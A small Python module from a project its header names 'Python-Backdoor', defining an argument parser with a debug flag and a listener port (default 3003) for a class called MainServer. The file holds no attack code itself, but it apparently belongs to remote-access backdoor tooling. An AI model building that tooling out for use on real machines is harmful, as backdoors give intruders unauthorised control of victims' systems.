"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""

from argparse import ArgumentParser


class Args:
    def __init__(self, parent):
        self.parser = ArgumentParser()
        self.parser.add_argument("-d", "--debug", help="debug mode", action="store_true")

        if str(type(parent).__name__) == "MainServer":
            self.parser.add_argument("-p", "--port", help="port number", type=int, default=3003)

    def get_args(self):
        return self.parser.parse_args()
